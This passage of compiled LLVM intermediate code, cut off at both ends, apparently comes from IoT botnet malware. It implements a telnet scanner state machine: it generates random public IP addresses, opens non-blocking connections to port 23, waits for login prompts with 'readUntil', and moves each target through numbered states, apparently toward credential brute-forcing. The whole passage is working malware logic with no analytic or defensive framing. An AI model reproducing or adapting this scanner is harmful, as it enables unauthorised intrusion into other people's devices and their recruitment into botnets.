; <label>:69:                                     ; preds = %65
  %70 = load i32, i32* %2, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 2
  %74 = load i8, i8* %73, align 8
  %75 = zext i8 %74 to i32
  switch i32 %75, label %2303 [
    i32 0, label %76
    i32 1, label %233
    i32 2, label %391
    i32 3, label %702
    i32 4, label %770
    i32 5, label %1131
    i32 6, label %1199
    i32 7, label %1901
    i32 8, label %1929
    i32 9, label %1957
    i32 10, label %2011
    i32 11, label %2022
    i32 12, label %2050
  ]

; <label>:76:                                     ; preds = %69
  %77 = load i32, i32* %2, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 8
  %81 = load i8*, i8** %80, align 8
  call void @llvm.memset.p0i8.i64(i8* %81, i8 0, i64 1024, i32 1, i1 false)
  %82 = load i32, i32* %2, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 3
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %108

; <label>:88:                                     ; preds = %76
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 8
  %93 = load i8*, i8** %92, align 8
  store i8* %93, i8** %11, align 8
  %94 = load i32, i32* %2, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %95
  %97 = bitcast %struct.telstate_t* %96 to i8*
  call void @llvm.memset.p0i8.i64(i8* %97, i8 0, i64 32, i32 16, i1 false)
  %98 = load i8*, i8** %11, align 8
  %99 = load i32, i32* %2, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 8
  store i8* %98, i8** %102, align 8
  %103 = call i32 @getRandomPublicIP()
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 1
  store i32 %103, i32* %107, align 4
  br label %147

; <label>:108:                                    ; preds = %76
  %109 = load i32, i32* %2, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 5
  %113 = load i8, i8* %112, align 1
  %114 = add i8 %113, 1
  store i8 %114, i8* %112, align 1
  %115 = load i32, i32* %2, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 5
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i64
  %121 = icmp eq i64 %120, 13
  br i1 %121, label %122, label %133

; <label>:122:                                    ; preds = %108
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 5
  store i8 0, i8* %126, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 4
  %131 = load i8, i8* %130, align 2
  %132 = add i8 %131, 1
  store i8 %132, i8* %130, align 2
  br label %133

; <label>:133:                                    ; preds = %122, %108
  %134 = load i32, i32* %2, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = zext i8 %138 to i64
  %140 = icmp eq i64 %139, 4
  br i1 %140, label %141, label %146

; <label>:141:                                    ; preds = %133
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 3
  store i8 1, i8* %145, align 1
  br label %2304

; <label>:146:                                    ; preds = %133
  br label %147

; <label>:147:                                    ; preds = %146, %88
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = call zeroext i16 @htons(i16 zeroext 23) #13
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %152 = getelementptr inbounds [8 x i8], [8 x i8]* %151, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %152, i8 0, i64 8, i32 4, i1 false)
  %153 = load i32, i32* %2, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 %157, i32* %159, align 4
  %160 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 0
  store i32 %160, i32* %164, align 16
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = bitcast %struct.timeval* %10 to i8*
  %171 = call i32 @setsockopt(i32 %169, i32 1, i32 20, i8* %170, i32 16) #2
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = bitcast %struct.timeval* %10 to i8*
  %178 = call i32 @setsockopt(i32 %176, i32 1, i32 21, i8* %177, i32 16) #2
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 16
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %147
  br label %2304

; <label>:186:                                    ; preds = %147
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = load i32, i32* %2, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = call i32 (i32, i32, ...) @fcntl(i32 %196, i32 3, i8* null)
  %198 = or i32 %197, 2048
  %199 = call i32 (i32, i32, ...) @fcntl(i32 %191, i32 4, i32 %198)
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %206 = call i32 @connect(i32 %204, %struct.sockaddr* %205, i32 16)
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %208, label %223

; <label>:208:                                    ; preds = %186
  %209 = call i32* @__errno_location() #13
  %210 = load i32, i32* %209, align 4
  %211 = icmp ne i32 %210, 115
  br i1 %211, label %212, label %223

; <label>:212:                                    ; preds = %208
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = call i32 @sclose(i32 %217)
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 3
  store i8 1, i8* %222, align 1
  br label %232

; <label>:223:                                    ; preds = %208, %186
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 2
  store i8 1, i8* %227, align 8
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 6
  store i32 0, i32* %231, align 4
  br label %232

; <label>:232:                                    ; preds = %223, %212
  br label %2303

; <label>:233:                                    ; preds = %69
  %234 = load i32, i32* %2, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %235
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %236, i32 0, i32 6
  %238 = load i32, i32* %237, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %247

; <label>:240:                                    ; preds = %233
  %241 = call i64 @time(i64* null) #2
  %242 = trunc i64 %241 to i32
  %243 = load i32, i32* %2, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 6
  store i32 %242, i32* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %240, %233
  br label %248

; <label>:248:                                    ; preds = %247
  %249 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %250 = getelementptr inbounds [16 x i64], [16 x i64]* %249, i64 0, i64 0
  %251 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %250) #2, !srcloc !5
  %252 = extractvalue { i64, i64* } %251, 0
  %253 = extractvalue { i64, i64* } %251, 1
  %254 = trunc i64 %252 to i32
  store i32 %254, i32* %12, align 4
  %255 = ptrtoint i64* %253 to i64
  %256 = trunc i64 %255 to i32
  store i32 %256, i32* %13, align 4
  br label %257

; <label>:257:                                    ; preds = %248
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = load i32, i32* %2, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %260
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 16
  %264 = srem i32 %263, 64
  %265 = zext i32 %264 to i64
  %266 = shl i64 1, %265
  %267 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %268 = load i32, i32* %2, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 16
  %273 = sdiv i32 %272, 64
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds [16 x i64], [16 x i64]* %267, i64 0, i64 %274
  %276 = load i64, i64* %275, align 8
  %277 = or i64 %276, %266
  store i64 %277, i64* %275, align 8
  %278 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %278, align 8
  %279 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %279, align 8
  %280 = load i32, i32* %2, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = add nsw i32 %284, 1
  %286 = call i32 @select(i32 %285, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %286, i32* %3, align 4
  %287 = load i32, i32* %3, align 4
  %288 = icmp eq i32 %287, 1
  br i1 %288, label %289, label %346

; <label>:289:                                    ; preds = %258
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %290 = load i32, i32* %2, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 16
  %295 = bitcast i32* %7 to i8*
  %296 = call i32 @getsockopt(i32 %294, i32 1, i32 4, i8* %295, i32* %6) #2
  %297 = load i32, i32* %7, align 4
  %298 = icmp ne i32 %297, 0
  br i1 %298, label %299, label %314

; <label>:299:                                    ; preds = %289
  %300 = load i32, i32* %2, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %301
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %302, i32 0, i32 0
  %304 = load i32, i32* %303, align 16
  %305 = call i32 @sclose(i32 %304)
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 2
  store i8 0, i8* %309, align 8
  %310 = load i32, i32* %2, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %311
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %312, i32 0, i32 3
  store i8 1, i8* %313, align 1
  br label %345

; <label>:314:                                    ; preds = %289
  %315 = load i32, i32* %2, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 16
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = call i32 (i32, i32, ...) @fcntl(i32 %324, i32 3, i8* null)
  %326 = and i32 %325, -2049
  %327 = call i32 (i32, i32, ...) @fcntl(i32 %319, i32 4, i32 %326)
  %328 = load i32, i32* %2, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %329
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %330, i32 0, i32 6
  store i32 0, i32* %331, align 4
  %332 = load i32, i32* %2, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 7
  store i16 0, i16* %335, align 16
  %336 = load i32, i32* %2, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %337
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %338, i32 0, i32 8
  %340 = load i8*, i8** %339, align 8
  call void @llvm.memset.p0i8.i64(i8* %340, i8 0, i64 1024, i32 1, i1 false)
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 2
  store i8 2, i8* %344, align 8
  br label %2304

; <label>:345:                                    ; preds = %299
  br label %365

; <label>:346:                                    ; preds = %258
  %347 = load i32, i32* %3, align 4
  %348 = icmp eq i32 %347, -1
  br i1 %348, label %349, label %364

; <label>:349:                                    ; preds = %346
  %350 = load i32, i32* %2, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 0
  %354 = load i32, i32* %353, align 16
  %355 = call i32 @sclose(i32 %354)
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 2
  store i8 0, i8* %359, align 8
  %360 = load i32, i32* %2, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 3
  store i8 1, i8* %363, align 1
  br label %364

; <label>:364:                                    ; preds = %349, %346
  br label %365

; <label>:365:                                    ; preds = %364, %345
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 6
  %370 = load i32, i32* %369, align 4
  %371 = add i32 %370, 10
  %372 = zext i32 %371 to i64
  %373 = call i64 @time(i64* null) #2
  %374 = icmp slt i64 %372, %373
  br i1 %374, label %375, label %390

; <label>:375:                                    ; preds = %365
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 16
  %381 = call i32 @sclose(i32 %380)
  %382 = load i32, i32* %2, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 2
  store i8 0, i8* %385, align 8
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 3
  store i8 1, i8* %389, align 1
  br label %390

; <label>:390:                                    ; preds = %375, %365
  br label %2303

; <label>:391:                                    ; preds = %69
  %392 = load i32, i32* %2, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 6
  %396 = load i32, i32* %395, align 4
  %397 = icmp eq i32 %396, 0
  br i1 %397, label %398, label %405

; <label>:398:                                    ; preds = %391
  %399 = call i64 @time(i64* null) #2
  %400 = trunc i64 %399 to i32
  %401 = load i32, i32* %2, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 6
  store i32 %400, i32* %404, align 4
  br label %405

; <label>:405:                                    ; preds = %398, %391
  %406 = load i32, i32* %2, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 0
  %410 = load i32, i32* %409, align 16
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 8
  %415 = load i8*, i8** %414, align 8
  %416 = load i32, i32* %2, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 7
  %420 = load i16, i16* %419, align 16
  %421 = zext i16 %420 to i32
  %422 = call i32 @readUntil(i32 %410, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %415, i32 1024, i32 %421)
  %423 = icmp ne i32 %422, 0
  br i1 %423, label %424, label %456

; <label>:424:                                    ; preds = %405
  %425 = load i32, i32* %2, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %426
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %427, i32 0, i32 6
  store i32 0, i32* %428, align 4
  %429 = load i32, i32* %2, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 7
  store i16 0, i16* %432, align 16
  %433 = load i32, i32* %2, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 8
  %437 = load i8*, i8** %436, align 8
  %438 = call i8* @strstr(i8* %437, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %439 = icmp ne i8* %438, null
  br i1 %439, label %440, label %445

; <label>:440:                                    ; preds = %424
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 2
  store i8 5, i8* %444, align 8
  br label %451

; <label>:445:                                    ; preds = %424
  %446 = load i32, i32* %2, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 8
  %450 = load i8*, i8** %449, align 8
  call void @llvm.memset.p0i8.i64(i8* %450, i8 0, i64 1024, i32 1, i1 false)
  br label %451

; <label>:451:                                    ; preds = %445, %440
  %452 = load i32, i32* %2, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %453
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %454, i32 0, i32 2
  store i8 3, i8* %455, align 8
  br label %2304

; <label>:456:                                    ; preds = %405
  %457 = load i32, i32* %2, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %458
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %459, i32 0, i32 0
  %461 = load i32, i32* %460, align 16
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 8
  %466 = load i8*, i8** %465, align 8
  %467 = load i32, i32* %2, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %468
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %469, i32 0, i32 7
  %471 = load i16, i16* %470, align 16
  %472 = zext i16 %471 to i32
  %473 = call i32 @readUntil(i32 %461, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %466, i32 1024, i32 %472)
  %474 = icmp ne i32 %473, 0
  br i1 %474, label %475, label %507

; <label>:475:                                    ; preds = %456
  %476 = load i32, i32* %2, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 6
  store i32 0, i32* %479, align 4
  %480 = load i32, i32* %2, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 7
  store i16 0, i16* %483, align 16
  %484 = load i32, i32* %2, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 8
  %488 = load i8*, i8** %487, align 8
  %489 = call i8* @strstr(i8* %488, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %490 = icmp ne i8* %489, null
  br i1 %490, label %491, label %496

; <label>:491:                                    ; preds = %475
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 2
  store i8 5, i8* %495, align 8
  br label %502

; <label>:496:                                    ; preds = %475
  %497 = load i32, i32* %2, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 8
  %501 = load i8*, i8** %500, align 8
  call void @llvm.memset.p0i8.i64(i8* %501, i8 0, i64 1024, i32 1, i1 false)
  br label %502

; <label>:502:                                    ; preds = %496, %491
  %503 = load i32, i32* %2, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 2
  store i8 3, i8* %506, align 8
  br label %2304

; <label>:507:                                    ; preds = %456
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 0
  %512 = load i32, i32* %511, align 16
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 8
  %517 = load i8*, i8** %516, align 8
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 7
  %522 = load i16, i16* %521, align 16
  %523 = zext i16 %522 to i32
  %524 = call i32 @readUntil(i32 %512, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %517, i32 1024, i32 %523)
  %525 = icmp ne i32 %524, 0
  br i1 %525, label %526, label %558

; <label>:526:                                    ; preds = %507
  %527 = load i32, i32* %2, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %528
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %529, i32 0, i32 6
  store i32 0, i32* %530, align 4
  %531 = load i32, i32* %2, align 4
  %532 = sext i32 %531 to i64
